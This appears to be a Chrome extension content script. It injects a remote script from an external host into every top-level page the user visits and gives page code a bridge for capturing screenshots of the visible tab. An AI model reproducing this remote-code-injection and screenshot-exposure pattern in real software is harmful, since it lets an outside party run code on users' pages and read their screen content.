//
// This script is executed on the page's DOM but without any access to the page's javascript.
//
(function () {

	var HI = 'hi',	// do not delete this line!
		SCRIPT_URL = 'http://fiora.sona.valentin.ws/js/agent.js',

		docConnect = {
			callbacks: {}, // index of callback functions by their ID
			lastCallbackId: 0,

			encodeData: function (data) {
				return JSON.stringify(data);
			},

			decodeData: function (data) {
				var res;

				try {
					res = JSON.parse(data);
				} catch (e) {
					res = {};
				}

				return res;
			},

			pushCallback: function (fn) {
				if (docConnect.lastCallbackId === 9999) {	// hope this will be enough
					docConnect.lastCallbackId = 1;
				} else {
					docConnect.lastCallbackId += 1;
				}
				docConnect.callbacks[docConnect.lastCallbackId] = fn;
				return docConnect.lastCallbackId;
			},

			popCallback: function (id) {
				var res;

				if (!docConnect.callbacks.hasOwnProperty(id)) {
					return function () {};
				}

				res = docConnect.callbacks[id];
				delete docConnect.callbacks[id];
				return res;
			},

			listenDocument: function (doc) {
				doc.addEventListener('rymnik-fromdoc-request', function (event) {
					var node = event.target,
						sender = node.ownerDocument,
						data = node.textContent.toString();

					return docConnect.answer(docConnect.decodeData(data), sender, function (respData) {
						if (!node.getAttribute('callbackId')) {
							return sender.documentElement.removeChild(node);
						}

						node.textContent = docConnect.encodeData(respData);

						var listener = sender.createEvent('Events');
						listener.initEvent('rymnik-fromdoc-response', true, false);
						return node.dispatchEvent(listener);
					});
				}, false, true);
			},

			question: function (doc, data, callback) {
				var request = doc.createElement('div');

				request.style.display = 'none';
				request.textContent = docConnect.encodeData(data);

				if (callback) {
					request.setAttribute('callbackId', docConnect.pushCallback(callback));

					var _listener = function (event) {
						var node = event.target,
							callback = docConnect.popCallback(node.getAttribute('callbackId')),
							response = docConnect.decodeData(node.textContent);

						doc.documentElement.removeChild(node);
						doc.removeEventListener('rymnik-todoc-response', _listener, false);
						return callback(response);
					};

					doc.addEventListener('rymnik-todoc-response', _listener, false);
				}
				doc.documentElement.appendChild(request);

				var sender = doc.createEvent('Events');
				sender.initEvent('rymnik-todoc-request', true, false);
				return request.dispatchEvent(sender);
			},

			answer: function (data, sender, callback) {
				if (!data.hasOwnProperty('method') ||
					!data.hasOwnProperty('params')) {
					return callback('bad request');
				}

				if (data.method === 'getScreenshot') {
					return getScreenshot(data.params, callback);
				}

				return callback('unknown method');
			},

			onRequestFromExtension: function (request, sender, sendResponse) {
				// We must check here if the message is addressed to this particular injected script.
			}
		},
		// end of docConnect

		getScreenshot = function (params, callback) {
			var canvas = document.createElement('canvas'),
				ctx = canvas.getContext('2d'),
				dataUrl = '',
				img = new Image();

			if (params.hasOwnProperty('left') &&
				params.hasOwnProperty('top') &&
				params.hasOwnProperty('width') &&
				params.hasOwnProperty('height')) {

				return chrome.extension.sendRequest({
					type: 'getVisibleArea'
				}, function (visibleArea) {
					// cropping the image
					img.onload = function () {
						canvas.setAttribute('width', params.width);
						canvas.setAttribute('height', params.height);
						// ambiguous call: drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight)
						ctx.drawImage(img,
							params.left - window.pageXOffset,
							params.top - window.pageYOffset,
							params.width,
							params.height,
							0,
							0,
							params.width,
							params.height
						);
						dataUrl = canvas.toDataURL('image/png');

						canvas = null;
						return callback(dataUrl);
					};
					img.src = visibleArea;	// it is data URL
				});
			}

			canvas = null;
			return callback(dataUrl);	// bad request
		},

		isTopPage = function (doc) {
			var win = doc.defaultView;
			if (doc.nodeName !== '#document' || // only documents
				win !== win.top || // only top window
				// win.frameElement ||  // skip iframes/frames (Chrome warns the user when accessing iframe.frameElement)
				doc.location.href === 'about:blank'  // skip new empty pages
			) {
				return false;
			}
			return true;
		},

		insertScript = function (doc, src, code) {
			var script = doc.createElement('script');

			script.setAttribute('type', 'text/javascript');
			script.setAttribute('async', 'true');
			if (src) {
				if (/^https:/i.test(doc.location.href)) {
					src = src.replace(/^http:/i, 'https:');
				}
				script.src = src;
			} else {
				script.innerHTML = code;
			}
			doc.body.appendChild(script);
		},

		onPageLoad = function () {
			var doc = document,
				win = window;

			if (isTopPage(doc)) {
				chrome.extension.onRequest.addListener(docConnect.onRequestFromExtension);
				chrome.extension.sendRequest({ type: 'handshake' }, function (res) {
					if (!res.isActive) {
						return 0;
					}

					docConnect.listenDocument(doc);
					win.addEventListener('unload', onTopPageUnload, true);
					insertScript(doc, SCRIPT_URL);
				});
			}
		},

		onTopPageUnload = function () {
		},

		main = function () {
			onPageLoad();
		};	// end of variable declarations

	main();

}());
